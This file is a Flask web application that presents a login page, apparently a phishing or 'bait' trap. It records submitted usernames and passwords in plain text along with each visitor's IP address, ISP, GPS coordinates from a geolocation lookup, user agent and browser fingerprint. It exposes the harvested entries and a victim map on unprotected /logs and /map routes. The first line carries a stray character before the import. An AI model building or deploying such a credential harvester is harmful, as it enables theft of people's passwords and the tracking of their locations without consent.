kfrom flask import Flask, request, render_template, make_response
from datetime import datetime
import requests
import json

app = Flask(__name__)

def get_location(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        if response.status_code == 200:
            data = response.json()
            return {
                "city": data.get("city", "Unknown"),
                "region": data.get("region", "Unknown"),
                "country": data.get("country", "Unknown"),
                "org": data.get("org", "Unknown"),
                "loc": data.get("loc", "0,0")
            }
    except:
        pass
    return {"city": "Unknown", "region": "Unknown", "country": "Unknown", "org": "Unknown", "loc": "0,0"}

@app.route('/')
def index():
    resp = make_response(render_template('login.html'))
    resp.set_cookie('bait_id', 'phizzytrap001')
    return resp

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.referrer or "None"
    lang = request.headers.get('Accept-Language', 'Unknown')
    bait_id = request.cookies.get('bait_id', 'None')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    loc = get_location(ip)

    with open("logins.txt", "a") as file:
        file.write(f"\n[Login Attempt - {timestamp}]\n")
        file.write(f"Username: {username} | Password: {password}\n")
        file.write(f"IP: {ip}\n")
        file.write(f"Location: {loc['city']}, {loc['region']}, {loc['country']} | ISP: {loc['org']} | GPS: {loc['loc']}\n")
        file.write(f"Referrer: {referrer} | Lang: {lang}\n")
        file.write(f"User-Agent: {user_agent} | Cookie: {bait_id}\n")
        file.write("-" * 50 + "\n")

    try:
        with open("data.json", "r") as f:
            data = json.load(f)
    except:
        data = []

    data.append({
        "time": timestamp,
        "ip": ip,
        "username": username,
        "password": password,
        "loc": loc["loc"],
        "city": loc["city"],
        "country": loc["country"],
        "ua": user_agent
    })

    with open("data.json", "w") as f:
        json.dump(data, f, indent=2)

    return render_template('loading.html')

@app.route('/fingerprint', methods=['POST'])
def fingerprint():
    data = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("fingerprints.txt", "a") as f:
        f.write(f"[{timestamp}] From IP: {ip}\n")
        for key, value in data.items():
            f.write(f"{key}: {value}\n")
        f.write("-" * 50 + "\n")
    return '', 204

@app.route('/logs')
def show_logs():
    try:
        with open("data.json") as f:
            data = json.load(f)
    except:
        data = []
    return render_template("logs.html", entries=data)

@app.route('/map')
def map_view():
    try:
        with open("data.json") as f:
            data = json.load(f)
    except:
        data = []
    coords = [{"loc": x["loc"], "ip": x["ip"], "city": x["city"]} for x in data if x["loc"] != "0,0"]
    return render_template("map.html", coords=coords)

@app.route('/session_expired')
def expired():
    return render_template("session_expired.html")
